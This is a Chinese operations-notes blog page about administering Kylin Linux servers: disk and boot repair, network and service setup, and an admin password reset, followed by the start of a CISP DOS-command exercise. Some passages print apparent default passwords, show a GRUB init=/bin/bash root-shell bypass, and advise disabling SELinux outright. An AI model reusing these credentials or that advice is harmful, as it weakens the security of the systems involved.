title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="12006-消防融合通信"><a href="#12006-消防融合通信" class="headerlink" title="12006 消防融合通信"></a>12006 消防融合通信</h2><h3 id="使用场景-6"><a href="#使用场景-6" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-6"><a href="#操作步骤-6" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="12007-进入单用户"><a href="#12007-进入单用户" class="headerlink" title="12007 进入单用户"></a>12007 进入单用户</h2><h3 id="使用场景-7"><a href="#使用场景-7" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-7"><a href="#操作步骤-7" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="虚拟机调用GPU独显配置"><a href="#虚拟机调用GPU独显配置" class="headerlink" title="虚拟机调用GPU独显配置"></a>虚拟机调用GPU独显配置</h2><pre><code class="hljs bash">虚拟机读取不到独显的图形渲染在lightdm.conf文件添加以下配置autologin-guest=<span class="hljs-literal">false</span>autologin-user=rootautologin-user-timeout=0以及在greeter.conf文件添加以下配置autologin-user=root重启lightdm服务，解决了此问题 </code></pre><h2 id="误删除boot根分区恢复操作"><a href="#误删除boot根分区恢复操作" class="headerlink" title="误删除boot根分区恢复操作"></a>误删除boot根分区恢复操作</h2><pre><code class="hljs bash">1、制作启动盘，随机进入liveCD模式2、lsblk查看根分区，通常SYSROOT就是根分区，假设是/dev/sda53、挂载：<span class="hljs-built_in">sudo</span>  mount  /dev/sda5  /mnt4、挂载必要文件系统:<span class="hljs-built_in">sudo</span>  mount  --<span class="hljs-built_in">bind</span>  /dev  /mnt/dev<span class="hljs-built_in">sudo</span>  mount  --<span class="hljs-built_in">bind</span>  /proc  /mnt/proc<span class="hljs-built_in">sudo</span>  mount  --<span class="hljs-built_in">bind</span>  /sys  /mnt/sys<span class="hljs-built_in">sudo</span>  mount  --<span class="hljs-built_in">bind</span>  /run  /mnt/run5、切换到跟文件系统：<span class="hljs-built_in">sudo</span>  <span class="hljs-built_in">chroot</span>  /mnt6、重装内核和Grub：apt  updateapt  install  --reinstall  linux-image-$(<span class="hljs-built_in">uname</span> -r)apt  install  --reinstall  grub-pc7、更新Grub配置：update-grubgrub-install  /dev/sda检查 <span class="hljs-built_in">cat</span>  /boot/grub/grub.cfg8、退出<span class="hljs-built_in">chroot</span>、解挂、重启：<span class="hljs-built_in">exit</span><span class="hljs-built_in">sudo</span>  umount  /mnt/dev<span class="hljs-built_in">sudo</span>  umount  /mnt/proc<span class="hljs-built_in">sudo</span>  umount  /mnt/sys<span class="hljs-built_in">sudo</span>  umount  /mnt/run<span class="hljs-built_in">sudo</span>  umount  /mnt<span class="hljs-built_in">sudo</span>  reboot</code></pre><hr><h1 id="二、服务器"><a href="#二、服务器" class="headerlink" title="二、服务器"></a>二、服务器</h1><h2 id="21001-SSH登录错误"><a href="#21001-SSH登录错误" class="headerlink" title="21001 SSH登录错误"></a>21001 SSH登录错误</h2><h3 id="问题描述-17"><a href="#问题描述-17" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-14"><a href="#问题分析过程-14" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-16"><a href="#问题解决方法-16" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><h2 id="21002-fstab-UUID错误无法进入系统"><a href="#21002-fstab-UUID错误无法进入系统" class="headerlink" title="21002 fstab UUID错误无法进入系统"></a>21002 fstab UUID错误无法进入系统</h2><h3 id="问题描述-18"><a href="#问题描述-18" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-15"><a href="#问题分析过程-15" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-17"><a href="#问题解决方法-17" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><h2 id="21003-无法配置Raid1"><a href="#21003-无法配置Raid1" class="headerlink" title="21003 无法配置Raid1"></a>21003 无法配置Raid1</h2><h3 id="问题描述-19"><a href="#问题描述-19" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-16"><a href="#问题分析过程-16" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-18"><a href="#问题解决方法-18" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><hr><h2 id="22000-系统激活"><a href="#22000-系统激活" class="headerlink" title="22000 系统激活"></a>22000 系统激活</h2><h3 id="使用场景-8"><a href="#使用场景-8" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-8"><a href="#操作步骤-8" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="22001-重装系统保留非系统盘数据"><a href="#22001-重装系统保留非系统盘数据" class="headerlink" title="22001 重装系统保留非系统盘数据"></a>22001 重装系统保留非系统盘数据</h2><h3 id="使用场景-9"><a href="#使用场景-9" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">服务器无法正常进入系统，需重装系统且保留非系统盘数据。复制代码</code></pre><h3 id="操作步骤-9"><a href="#操作步骤-9" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs stata">步骤1.使用安装介质正常启动服务器，直至进入系统安装界面。步骤2.在安装界面中，选择“硬盘”选项，接着点击“自定义分区”。步骤3.先对 <span class="hljs-keyword">boot</span>、efi、swap、/ 等系统分区，重新输入对应的挂载点，并勾选“格式化”选项，完成设置后点击“<span class="hljs-keyword">Update</span> Settings”。步骤4.再对其他非系统分区的数据分区，重新输入挂载点，然后点击“<span class="hljs-keyword">Update</span> Settings”。步骤5.仔细检查所有分区设置无误后，点击“完成”，按照安装程序的其他要求完成系统安装配置即可。复制代码</code></pre><h3 id="22002-磁盘修复问题"><a href="#22002-磁盘修复问题" class="headerlink" title="22002 磁盘修复问题"></a>22002 磁盘修复问题</h3><pre><code class="hljs bash">系统启动不起来，挂iso镜像启动查看情况有时候是磁盘满了导致，需要清理，还可能是selinux没关闭导致服务器突然断电，导致系统进不去：Troubleshootingrescue a Kylin linux advanced server system先用同镜像的启动盘或光盘进入安装系统的界面（注：不要安装系统，进安装到界面就行）然后按 ctrl+alt+F2（可以进到一个root的命令界面，按照下面操作）vgs <span class="hljs-comment"># 查看VG</span>vgchange  -ay  klas <span class="hljs-comment"># 激活根分区VG</span><span class="hljs-built_in">mkdir</span>  /test <span class="hljs-comment"># 创建挂载点</span>mount  /dev/klas/root  /test <span class="hljs-comment"># 挂载根分区，此时挂载失败</span>xfs_repair  /dev/klas/root <span class="hljs-comment"># 尝试修复根分区</span>mount  /dev/klas/root  /test <span class="hljs-comment"># 再次挂载根分区，如果还是挂载失败继续执行下面的命令</span>强制修复：xfs_repair  -L  /dev/klas/root mount  /dev/klas/root  /test <span class="hljs-comment"># 再次挂载根分区，此时成功挂载的话就可以重启进入系统了</span></code></pre><h2 id="22002-ethtool-工具识别物理网卡"><a href="#22002-ethtool-工具识别物理网卡" class="headerlink" title="22002 ethtool 工具识别物理网卡"></a>22002 ethtool 工具识别物理网卡</h2><h3 id="使用场景-10"><a href="#使用场景-10" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">在物理机上配置网络时，需要确认逻辑网卡和物理网卡的映射关系。复制代码</code></pre><h3 id="操作步骤-10"><a href="#操作步骤-10" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs css">步骤<span class="hljs-number">1</span>.查看逻辑网卡名称执行命令：ifconfig -<span class="hljs-selector-tag">a</span> 或者 ip link show步骤<span class="hljs-number">2</span>.使用 ethtool 标识网卡执行命令：ethtool -<span class="hljs-selector-tag">p</span> &lt;逻辑网卡名&gt; &lt;闪烁时长（秒）&gt;   # 例如：ethtool -<span class="hljs-selector-tag">p</span> eth0 <span class="hljs-number">10</span>复制代码</code></pre><h2 id="22003-说动配置网络"><a href="#22003-说动配置网络" class="headerlink" title="22003 说动配置网络"></a>22003 说动配置网络</h2><h3 id="使用场景-11"><a href="#使用场景-11" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-11"><a href="#操作步骤-11" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="22004-配置Bond网络"><a href="#22004-配置Bond网络" class="headerlink" title="22004 配置Bond网络"></a>22004 配置Bond网络</h2><h3 id="使用场景-12"><a href="#使用场景-12" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-12"><a href="#操作步骤-12" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="22005-重装用户密码"><a href="#22005-重装用户密码" class="headerlink" title="22005 重装用户密码"></a>22005 重装用户密码</h2><h3 id="使用场景-13"><a href="#使用场景-13" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-13"><a href="#操作步骤-13" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="22006-磁盘修复"><a href="#22006-磁盘修复" class="headerlink" title="22006 磁盘修复"></a>22006 磁盘修复</h2><h3 id="使用场景-14"><a href="#使用场景-14" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-14"><a href="#操作步骤-14" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="22007-VNC安装和配置"><a href="#22007-VNC安装和配置" class="headerlink" title="22007 VNC安装和配置"></a>22007 VNC安装和配置</h2><h3 id="使用场景-15"><a href="#使用场景-15" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-15"><a href="#操作步骤-15" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="22008-Deepseek调优"><a href="#22008-Deepseek调优" class="headerlink" title="22008 Deepseek调优"></a>22008 Deepseek调优</h2><h3 id="使用场景-16"><a href="#使用场景-16" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-16"><a href="#操作步骤-16" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="22009-SNMP-安装和配置"><a href="#22009-SNMP-安装和配置" class="headerlink" title="22009 SNMP 安装和配置"></a>22009 SNMP 安装和配置</h2><h3 id="使用场景-17"><a href="#使用场景-17" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-17"><a href="#操作步骤-17" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="22010-vsftpd安装和配置"><a href="#22010-vsftpd安装和配置" class="headerlink" title="22010 vsftpd安装和配置"></a>22010 vsftpd安装和配置</h2><h3 id="使用场景-18"><a href="#使用场景-18" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-18"><a href="#操作步骤-18" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs bash">一、首先服务器得有公网或者本地源二、执行安装命令：<span class="hljs-built_in">sudo</span>  yum  install  vsftpd三、启动服务：<span class="hljs-built_in">sudo</span>  systemctl  start  vsftpd四、vsftpd的配置文件：/etc/vsftpd/vsftpd.conf五、如果需要配置被动模式：1、vi  /etc/vsftpd/vsftpd.conf，在最后面添加以下配置pasv_enable=YES   <span class="hljs-comment"># 开启被动模式</span>pasv_min_port=30000   <span class="hljs-comment"># 被动模式端口范围最小端口</span>pasv_max_port=30100   <span class="hljs-comment"># 被动模式端口范围最大端口</span>listen_port=30099   <span class="hljs-comment"># 指定端口不是21，改用其余端口。此端口必须在上面的最大最小范围内</span>2、改完保存重启：systemctl  restart  vsftpd六、跟vsftpd.conf同级有两个文件，1、一个是ftpuser（绝对黑名单文件）2、一个是user_list（动态名单，优先级低于ftpuser）当vsftpd.conf配置userlist_enable=YES+ userlist_deny=YES（默认），user_list是黑名单当vsftpd.conf配置userlist_enable=YES+ userlist_deny=NO，user_list是白名单当vsftpd.conf配置userlist_enable=NO，user_list无效chroot_local_user=YES   <span class="hljs-comment"># 限制用户只能在自己的主目录</span>chroot_list_enable=YES   <span class="hljs-comment"># 在conf文件平级创建一个chroot_list文件，里面添加的用户不受chroot_local_user=YES的限制</span>注：安装vsftpd以后，默认的vsftpd.conf配置文件就可以使用（目前测试只支持普通用户使用vsftpd）</code></pre><h3 id="SNMP设置"><a href="#SNMP设置" class="headerlink" title="SNMP设置"></a>SNMP设置</h3><pre><code class="hljs bash">（1）yum install net-snmp,yum install net-snmp-utils（2）vi /etc/snmp/snmpd.conf，改团体名（recommunity 参数就是团体名）（3）关闭内核防火墙。vi /etc/selinux/config   把SELINUX=enforcing设置成disabled，并重启生效，否则会拦住SNMP数据包；（或使用setenforce 0命令，重启其他应用后临时生效）（4）重启 systemctl restart snmpd（5）设置为开机启动  systemctl <span class="hljs-built_in">enable</span> snmpd（6）允许进入的连接衍生端口能进行后续操作：iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT测试：snmpwalk -v 2c -c yjww@2023r 127.0.0.1</code></pre><h3 id="服务器修改网络名为-eth"><a href="#服务器修改网络名为-eth" class="headerlink" title="服务器修改网络名为 eth"></a>服务器修改网络名为 eth</h3><pre><code class="hljs bash">1、<span class="hljs-built_in">cd</span>  /etc/udev/rules.d/2、vi  76-netnames.rules<span class="hljs-comment"># 改网卡名为eth</span>SUBSYSTEM==<span class="hljs-string">&quot;net&quot;</span>, KERNEL==<span class="hljs-string">&quot;eth*.*&quot;</span> ACTION==<span class="hljs-string">&quot;add&quot;</span>, NAME=<span class="hljs-string">&quot;<span class="hljs-variable">$kernel</span>&quot;</span><span class="hljs-comment"># 改网卡名为bond</span><span class="hljs-comment">#SUBSYSTEM==&quot;net&quot;, KERNEL==&quot;bond*.*&quot; ACTION==&quot;add&quot;, NAME=&quot;$kernel&quot;</span><span class="hljs-comment"># 改网卡名为clan</span><span class="hljs-comment">#SUBSYSTEM==&quot;net&quot;, KERNEL==&quot;vlan*.*&quot; ACTION==&quot;add&quot;, NAME=&quot;$kernel&quot;</span>3、vi  75-network.rules<span class="hljs-comment"># address是网卡的MAC地址，name是自己自定义的网卡名</span>SUBSYSTEM==<span class="hljs-string">&quot;net&quot;</span>, ACTION==<span class="hljs-string">&quot;add&quot;</span>, ATTR&#123;address&#125;==<span class="hljs-string">&quot;00:0c:29:ba:f3:61&quot;</span>, NAME=<span class="hljs-string">&quot;eth4&quot;</span>SUBSYSTEM==<span class="hljs-string">&quot;net&quot;</span>, ACTION==<span class="hljs-string">&quot;add&quot;</span>, ATTR&#123;address&#125;==<span class="hljs-string">&quot;00:0c:29:ba:f3:61&quot;</span>, NAME=<span class="hljs-string">&quot;eth4&quot;</span>4、重启系统生效5、添加网卡 nmcli connection add <span class="hljs-built_in">type</span> ethernet con-name <span class="hljs-string">&quot;eth4&quot;</span> ifname eth4备注：安装系统的时候直接改成eth1、在安装引导的界面，选择“Install KylinLinux Advanced Server V10”然后按 e （注：有的可能按 tab）2、在那个有 quiet 的后面加上 net.ifnames=0  biosdevname=0 （注：装好操作系统grub加前面的配置也可以）3、然后ctrl+x继续，安装完电口和光口的网卡就全是eth开头的名字了4、如果保持光口名称不变1.在 /etc/udev/rules.d/ 目录下创建一个新的规则文件，例如 70-custom-net-names.rulesSUBSYSTEM==<span class="hljs-string">&quot;net&quot;</span>, ACTION==<span class="hljs-string">&quot;add&quot;</span>, ATTR&#123;address&#125;==<span class="hljs-string">&quot;00:11:22:33:44:57&quot;</span>, NAME=<span class="hljs-string">&quot;enp1s0f0&quot;</span>SUBSYSTEM==<span class="hljs-string">&quot;net&quot;</span>, ACTION==<span class="hljs-string">&quot;add&quot;</span>, ATTR&#123;address&#125;==<span class="hljs-string">&quot;00:11:22:33:44:58&quot;</span>, NAME=<span class="hljs-string">&quot;enp1s0f1&quot;</span>2.重启生效</code></pre><h3 id="单网络配置多IP地址"><a href="#单网络配置多IP地址" class="headerlink" title="单网络配置多IP地址"></a>单网络配置多IP地址</h3><pre><code class="hljs bash"><span class="hljs-comment"># 一张网卡配置多个IP，必须要是同网段的，不然默认网关会出问题</span>HWADDR=00:0C:29:66:7F:44TYPE=EthernetPROXY_METHOD=noneBROWSER_ONLY=noBOOTPROTO=noneDEFROUTE=<span class="hljs-built_in">yes</span>IPV4_FAILURE_FATAL=noIPV6INIT=<span class="hljs-built_in">yes</span>IPV6_AUTOCONF=<span class="hljs-built_in">yes</span>IPV6_DEFROUTE=<span class="hljs-built_in">yes</span>IPV6_FAILURE_FATAL=noIPV6_PRIVACY=noIPV6_ADDR_GEN_MODE=stable-privacyNAME=ens40UUID=40c0a17c-2191-4391-99bc-144640779684DEVICE=ens40ONBOOT=<span class="hljs-built_in">yes</span>GATEWAY=10.10.14.1   <span class="hljs-comment"># 网关</span>IPADDR=10.10.14.138   <span class="hljs-comment"># 第一个IP地址</span>PREFIX=24   <span class="hljs-comment"># 第一个IP地址掩码位</span>IPADDR1=10.10.14.238   <span class="hljs-comment"># 第二个IP地址</span>PREFIX1=24   <span class="hljs-comment"># 第二个IP地址掩码位</span></code></pre><h3 id="禁用SSH登录"><a href="#禁用SSH登录" class="headerlink" title="禁用SSH登录"></a>禁用SSH登录</h3><pre><code class="hljs bash">一、禁止使用ssh远程登录1、禁止root用户：vi  /etc/ssh/sshd_config，添加 【PermitRootLogin no】 或者将 【PermitRootLogin <span class="hljs-built_in">yes</span> 改成 PermitRootLogin no】2、禁止普通用户：vi  /etc/ssh/sshd_config，添加 【DenyUsers user1 user2 user3】，可以是多个用户，也可以是一个用户3、禁止用户组：vi  /etc/ssh/sshd_config，添加 【DenyGroups group1 group2 group3】，可以是多个用户组，也可以是一个用户组二、重启sshd服务：systemctl  restart  sshdDenyUsers user1 user2   <span class="hljs-comment"># 禁止用户使用ssh，空格可以跟多个用户</span>DenyGroups group1 group2   <span class="hljs-comment"># 禁止用户组使用ssh，空格可以跟多个用户组</span></code></pre><h2 id="22017-配置永久静态路由"><a href="#22017-配置永久静态路由" class="headerlink" title="22017 配置永久静态路由"></a>22017 配置永久静态路由</h2><pre><code class="hljs bash">route  add  -net  10.0.0.0  netmask  255.0.0.0  gw  192.168.0.1  dev  ens33ip  route  add  10.0.0.0/16  via  192.168.0.1  dev  ens33</code></pre><h2 id="服务器进入单用户"><a href="#服务器进入单用户" class="headerlink" title="服务器进入单用户"></a>服务器进入单用户</h2><pre><code class="hljs bash">进主机单用户，修改root密码或者是开机用户的密码1、重启主机，在选择界面按：e2、输入用户名：root    密码：Kylin1231233、然后找到linux或linux16行，ro改成rw，在audit=0后面或者security之前加：init=/bin/bash（注：如果是SP1需要多加一个 console=tty0 ）4、没有audit=0就在security之前加；然后：F10 或者 ctrl+x5、进入以后是命令行的模式，默认是root用户</code></pre><h2 id="挂载本地源"><a href="#挂载本地源" class="headerlink" title="挂载本地源"></a>挂载本地源</h2><pre><code class="hljs bash">Kylin：1、首先将镜像包传入服务器，要ISO全量2、然后执行 <span class="hljs-built_in">mkdir</span> -p /mnt/cdrom3、执行镜像挂载：mount -o loop /home/Kylin-Server-V10-SP3-2403-Release-20240426-x86_64.iso /mnt/cdromvi /etc/fstab/home/Kylin-Server-V10-SP3-2403-Release-20240426-x86_64.iso   /mnt/cdrom iso9660 loop 0 04、在/etc/yum.repos.d路径下，创建一个bak目录：<span class="hljs-built_in">mkdir</span> bak   ,然后移动所有到bak：<span class="hljs-built_in">mv</span> *.repo bak/再创建一个Kylin-base.repo的文件编辑下面的进去，保存；文件里面的备注不需要[base]name=Kylin-osbaseurl=file:///mnt/cdrom/enabled=1gpgcheck=05、执行 yum clean all &amp;&amp; yum makecache</code></pre><hr><h1 id="三、软件商店"><a href="#三、软件商店" class="headerlink" title="三、软件商店"></a>三、软件商店</h1><h2 id="31000-配置后台强制更新"><a href="#31000-配置后台强制更新" class="headerlink" title="31000 配置后台强制更新"></a>31000 配置后台强制更新</h2><h3 id="问题描述-20"><a href="#问题描述-20" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-17"><a href="#问题分析过程-17" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-19"><a href="#问题解决方法-19" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><h2 id="admin-密码恢复问题"><a href="#admin-密码恢复问题" class="headerlink" title="admin 密码恢复问题"></a>admin 密码恢复问题</h2><pre><code class="hljs bash">1、查看服务是否正常：docker  ps  -a2、进入容器：docker  <span class="hljs-built_in">exec</span>  -it  kylinSoft  bash3、进入数据库：mysql  -u  root  -p4、切换指定数据库：use  kylin_soft_shop;6、恢复默认密码：update t_user <span class="hljs-built_in">set</span> PASSWORD= <span class="hljs-string">&#x27;690d74d4976760a73ee84c3fa6bef3e6&#x27;</span> <span class="hljs-built_in">where</span> USERNAME=<span class="hljs-string">&#x27;admin&#x27;</span>;7、退出mysql数据库：<span class="hljs-built_in">exit</span> 或者 q;（回到容器内）8、清楚redis缓存：redis-cli  -a  kylin@123  flushall</code></pre><hr><h1 id="四、安全域控"><a href="#四、安全域控" class="headerlink" title="四、安全域控"></a>四、安全域控</h1><h2 id="41000-域控同步AD域数据问题"><a href="#41000-域控同步AD域数据问题" class="headerlink" title="41000 域控同步AD域数据问题"></a>41000 域控同步AD域数据问题</h2><h3 id="问题描述-21"><a href="#问题描述-21" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-18"><a href="#问题分析过程-18" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-20"><a href="#问题解决方法-20" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><hr><h1 id="五、KMS"><a href="#五、KMS" class="headerlink" title="五、KMS"></a>五、KMS</h1><hr><h1 id="六、邮件"><a href="#六、邮件" class="headerlink" title="六、邮件"></a>六、邮件</h1><hr><h1 id="七、云平台"><a href="#七、云平台" class="headerlink" title="七、云平台"></a>七、云平台</h1><h1 id="九、问题-解决方法-待删除"><a href="#九、问题-解决方法-待删除" class="headerlink" title="九、问题&amp;解决方法-待删除"></a>九、问题&amp;解决方法-待删除</h1><h2 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h2><p><a href="https://askubuntu.com/questions/47311/how-do-i-disable-my-system-from-going-to-sleep">命令行关闭息屏|休眠|睡眠</a></p><pre><code class="hljs bash"><span class="hljs-comment"># 关闭</span><span class="hljs-built_in">sudo</span> systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target<span class="hljs-comment"># 开启</span><span class="hljs-built_in">sudo</span> systemctl unmask sleep.target suspend.target hibernate.target hybrid-sleep.target</code></pre><h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h3><pre><code class="hljs bash"><span class="hljs-comment"># 1. 安装SSH服务</span><span class="hljs-built_in">sudo</span> yum install openssh-server<span class="hljs-comment"># 2. 配置防火墙</span><span class="hljs-comment"># firewalld</span><span class="hljs-built_in">sudo</span> firewall-cmd --permanent --zone=public --add-service=ssh<span class="hljs-built_in">sudo</span> firewall-cmd --reload<span class="hljs-comment"># iptables</span><span class="hljs-built_in">sudo</span> iptables -A INPUT -p tcp --dport 22 -j ACCEPT<span class="hljs-built_in">sudo</span> iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT<span class="hljs-comment"># 3. </span><span class="hljs-built_in">sudo</span> systemctl restart sshd</code></pre><h3 id="wireguard"><a href="#wireguard" class="headerlink" title="wireguard"></a>wireguard</h3><pre><code class="hljs bash"><span class="hljs-comment"># 1. 安装WireGuard</span><span class="hljs-built_in">sudo</span> add-apt-repository ppa:wireguard/wireguard<span class="hljs-built_in">sudo</span> apt-get update<span class="hljs-built_in">sudo</span> apt-get install wireguard wireguard-tools<span class="hljs-comment"># 2. 启用IP转发</span><span class="hljs-built_in">sudo</span> vi /etc/sysctl.conf<span class="hljs-comment">#</span>net.ipv4.ip_forward=1<span class="hljs-comment">#</span><span class="hljs-built_in">sudo</span> sysctl -p<span class="hljs-comment">## 3. 创建WireGuard接口</span><span class="hljs-comment"># 生成密钥对</span>wg genkey | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/wireguard/privatekey | wg pubkey | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/wireguard/publickey &gt; /dev/null<span class="hljs-comment">## 4. 创建配置文件</span><span class="hljs-built_in">sudo</span> vi /etc/wireguard/wg0.conf<span class="hljs-comment">#</span>[Interface]Address = 10.0.0.2/24PrivateKey = &lt;客户端私钥&gt;DNS = 10.0.70.1 [Peer]PublicKey = &lt;服务器公钥&gt;AllowedIPs = 0.0.0.0/0, ::/0  <span class="hljs-comment"># 允许所有IP流量通过VPN隧道（谨慎使用）</span>Endpoint = &lt;服务器IP&gt;:51820  <span class="hljs-comment"># 服务器的公网IP和端口号</span>PersistentKeepalive = 30  <span class="hljs-comment"># 保持连接活跃的频率（秒）</span><span class="hljs-comment"># 5. 启动WireGuard服务</span><span class="hljs-built_in">sudo</span> wg-quick up wg0</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cisp-practice</title>
      <link href="/2025/08/21/cisp-practice/"/>
      <url>/2025/08/21/cisp-practice/</url>
      
        <content type="html"><![CDATA[<h2 id="cisp-practice01-DOS命令–文件管理"><a href="#cisp-practice01-DOS命令–文件管理" class="headerlink" title="cisp-practice01 - DOS命令–文件管理"></a>cisp-practice01 - DOS命令–文件管理</h2><p>1、打开“开始”-“运行”-输入“cmd”，进入DOS命令提示符；</p><p>2、从C盘进入D盘，在D:\ 盘根目录下，使用md命令建立如下所示的多级目录，并查看文件夹是否创建</p><p>成功；</p><p>3、使用cd命令进入子目录，继续使用md命令建立如下多级目录，并查看是否创建成功；</p><p>4、使用cd&gt;命令在ceshi01文件家里创建ceshi.txt，并查看是否创建成功；</p><p>5、将“hello word”写入ceshi.txt，并在命令提示符中浏览；</p><p>6、将massage“we are here”覆盖到ceshi.txt当中，并在命令提示符中浏览；</p><p>7、在ceshi.txt追加massage“hello wangdun”，并在命令提示符中浏览；</p><p>8、复制文件ceshi.txt到ceshi02，并更改文件名为haha.txt，查看是否更改成功；</p><p>9、使用del命令进行删除haha.txt文件，并查看是否成功删除；</p><p>10、使用rd命令删除先删除ceshi02文件夹，再删除test02文件文件夹，并查看是否成功删除；</p><p>11、使用rd命令删除test01，并查看是否成功删除；</p><p>12、exit退出命令提示符。</p><hr><h2 id="cisp-practice02"><a href="#cisp-practice02" class="headerlink" title="cisp-practice02"></a>cisp-practice02</h2><p>1、虚拟机的运行模式？</p><p>VMware:全虚拟化</p><p>2、家庭网络、工作网络、公用网络，哪个类型安全性最低？</p><p>公用网络</p><p>3、虚拟机中实现真实机与虚拟机互动的工具叫什么？</p><p>VMware Tools</p><p>4、可以将虚拟机状态恢复到最佳状态的VMware 功能是什么？</p><p>快照</p><p>5、虚拟机的三种网络模式是什么？</p><p>仅主机</p><p>桥接</p><p>NAT</p><p>6、获取本地IP地址的命令是？</p><p>ipconfig</p><p>7、测试网络联通性的命令是？</p><p>ping&#x2F;tracert</p><p>8、显示当前路径下的文件和目录的命令是？</p><p>dir</p><p>可选参数 &#x2F;s &#x2F;p &#x2F;a</p><p>9、通配符？和*的区别？</p><p>?代表一个字符</p><p>*可表示任意字符</p><p>10、如何返回上级目录？</p><p>cd ..</p><p>11、用绝对路径在D盘的“ceshi”文件夹下面创建一个“test.txt”，命令书写？</p><p>cd &gt; D:\ceshi\test.txt</p><p>12、从C盘进入D盘的命令书写是？</p><p>cd &#x2F;d D:</p><p>或者D:</p><p>13、创建一个abcdefg的目录树？</p><p>md a&#x2F;b&#x2F;c&#x2F;d&#x2F;e&#x2F;f&#x2F;g</p><p>14、忘记命令用法可以采取什么方法解决？</p><p>command &#x2F;?</p><p>15、用绝对路径创建一条文字信息“wuhanwangdun”到桌面下的文件“test.txt”，命令如何书写？</p><p>echo wuhanwangdun &gt; “%USERPROFILE%\Desktop\test.txt”</p><p>16、NTFS的默认继承是指？</p><p>默认继承权限；可以通过禁用继承，修改权限和主体；</p><p>aa&#x2F;bb: 